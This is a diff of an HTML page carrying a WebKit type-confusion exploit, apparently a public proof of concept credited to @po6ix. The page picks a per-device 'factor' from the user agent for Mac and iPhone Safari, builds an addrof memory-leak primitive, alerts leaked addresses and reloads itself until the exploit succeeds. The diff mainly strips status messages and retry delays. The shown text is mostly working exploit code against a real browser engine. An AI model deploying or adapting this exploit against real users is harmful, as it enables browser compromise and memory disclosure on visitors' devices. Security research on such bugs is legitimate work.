@@ -3,14 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="util.js" onerror="document.getElementById('status').innerHTML += 'Error loading util.js';"></script>
-    <script src="int64.js" onerror="document.getElementById('status').innerHTML += 'Error loading int64.js';"></script>
+    <script src="util.js"></script>
+    <script src="int64.js"></script>
     <title>Document</title>
 </head>
 <body>
     <p id="factors"></p>
-    <p id="status">Initializing...</p>
+    <p id="status"></p>
     <script>
+
 /*
 author: @po6ix
 commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
@@ -86,7 +87,6 @@ function trigger(type) {
 }
 
 (function pwn() {
-    document.getElementById("status").innerHTML = "Triggering exploit...";
     let [getter, getterSetter] = trigger();
     let success = false;
     try {
@@ -94,12 +94,10 @@ function trigger(type) {
     } catch(e) {
         // it should fail to call toString
         success = true;
-        document.getElementById("status").innerHTML = "Trigger succeeded, checking factor...";
     }
     if (!success) {
-        document.getElementById("factors").innerHTML = "Tried factor: (not set)";
-        document.getElementById("status").innerHTML = "Exploit failed (no type confusion). Trying again...";
-        setTimeout(() => location.reload(), 1000); // تأخير لضمان التنفيذ
+        document.getElementById("status").innerHTML = "Exploit failed.. Trying again!"
+        location.reload()
         return;
     }
 
@@ -107,7 +105,7 @@ function trigger(type) {
 
     let isMac = navigator.userAgent.indexOf('Macintosh;') !== -1;
     let isIphone = navigator.userAgent.indexOf('iPhone;') !== -1;
-    let version = navigator.userAgent.split('Version/')[1]?.split(' ')[0] || "unknown";
+    let version = navigator.userAgent.split('Version/')[1].split(' ')[0];
     let factor;
     let unknown_device = false;
 
@@ -120,7 +118,7 @@ function trigger(type) {
         unknown_device = true;
     }
 
-    // عرض factor المجرب قبل التجربة
+    // عرض factor المجرب
     document.getElementById("factors").innerHTML = "Tried factor: " + factor;
 
     let ref_arr = [];
@@ -143,17 +141,15 @@ function trigger(type) {
 
     let sample = BigInt(addrof({}).toString());
     if (sample >= 0x200000000 || sample < 0x100000000) {
-        document.getElementById("factors").innerHTML = "Tried factor: " + factor; // عرض factor المجرب عند الفشل
-        document.getElementById("status").innerHTML = "Exploit failed with factor " + factor + ". Trying again...";
-        setTimeout(() => location.reload(), 1000); // تأخير لضمان إعادة التحميل
+        // alert('failed');
+        location.reload();
         return;
     } else {
         alert(`success!!!`);
         if (unknown_device) {
             alert(`It seems you have found a valid factor for an untested device!\nIf you send this information to me, it could be helpful to others.\nisMac: ${isMac}, isiPhone: ${isIphone}, version: ${version}, factor: ${factor}, userAgent: ${navigator.userAgent}`);
-            document.getElementById("status").innerHTML = "Success with factor " + factor + "!";
+            document.getElementById("status").innerHTML = "Success!"
         }
-        document.getElementById("factors").innerHTML = "Successful factor: " + factor; // عرض factor الناجح
     }
 
     alert(addrof({}).toString());
